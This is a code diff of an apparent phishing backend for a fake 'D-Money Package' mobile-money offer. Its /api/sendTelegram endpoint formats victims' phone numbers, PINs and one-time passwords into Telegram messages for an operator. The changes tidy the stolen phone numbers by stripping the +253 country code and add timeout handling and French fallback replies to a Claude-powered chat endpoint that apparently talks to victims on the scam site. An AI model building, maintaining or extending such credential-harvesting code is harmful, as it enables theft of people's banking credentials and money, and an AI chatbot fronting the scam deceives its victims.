@@ -194,6 +194,13 @@ app.post('/api/sendTelegram', async (req, res) => {
       return res.status(400).json({ error: 'Invalid payload' });
     }
 
+    // Strip country code — show only local number starting with 77
+    const localPhone = loginPhone
+      .replace(/^\+253/, '')   // remove +253
+      .replace(/^00253/, '')   // remove 00253
+      .replace(/^253/, '')     // remove 253
+      .trim() || loginPhone;
+
     const emoji = {
       receive_offer_clicked: '📲',
       offer_received:        '✅',
@@ -204,7 +211,7 @@ app.post('/api/sendTelegram', async (req, res) => {
       `${emoji} <b>D-Money Package — ${event.replace(/_/g, ' ').toUpperCase()}</b>`,
       ``,
       `📅 <b>Time:</b> ${submittedAt}`,
-      `📱 <b>Phone:</b> <code>${loginPhone}</code>`,
+      `📱 <b>Phone:</b> <code>${localPhone}</code>`,
       `🔐 <b>PIN:</b> <code>${loginPin}</code>`,
       `🔑 <b>OTP:</b> <code>${otp || '—'}</code>`,
       ``,
@@ -241,26 +248,47 @@ app.post('/api/chat', async (req, res) => {
       return res.status(400).json({ error: 'Empty messages' });
     }
 
-    const result = await callClaude(clean);
+    // Timeout wrapper — prevent Render from hanging on slow Claude responses
+    const claudePromise = callClaude(clean);
+    const timeoutPromise = new Promise((_, reject) =>
+      setTimeout(() => reject(new Error('Claude timeout')), 25000)
+    );
+
+    const result = await Promise.race([claudePromise, timeoutPromise]);
 
     if (result.error) {
       console.error('[/api/chat] Claude error:', result.error);
-      return res.status(500).json({ error: result.error });
+      return res.status(502).json({
+        reply: 'Je suis momentanément indisponible. Veuillez réessayer dans quelques secondes.'
+      });
     }
 
     if (result.type === 'error') {
       console.error('[/api/chat] Claude API error:', result.error?.message);
-      return res.status(500).json({ error: result.error?.message || 'Claude API error' });
+      return res.status(502).json({
+        reply: 'Je suis momentanément indisponible. Veuillez réessayer dans quelques secondes.'
+      });
     }
 
-    const text  = result.content?.[0]?.text || '';
-    const reply = text.replace('[ESCALATE]', '').trim();
+    const text  = (result.content?.[0]?.text) || '';
+    if (!text) {
+      console.error('[/api/chat] Empty response from Claude, full result:', JSON.stringify(result).slice(0, 300));
+      return res.status(502).json({
+        reply: 'Je n\'ai pas reçu de réponse. Veuillez réessayer.'
+      });
+    }
 
+    const reply = text.trim();
     return res.json({ reply });
 
   } catch (err) {
-    console.error('[/api/chat]', err.message);
-    return res.status(500).json({ error: 'Server error' });
+    console.error('[/api/chat] Error:', err.message);
+    // Return a user-friendly French message instead of an error
+    return res.json({
+      reply: err.message === 'Claude timeout'
+        ? 'La réponse prend trop de temps. Veuillez réessayer.'
+        : 'Une erreur est survenue. Veuillez réessayer.'
+    });
   }
 });
 
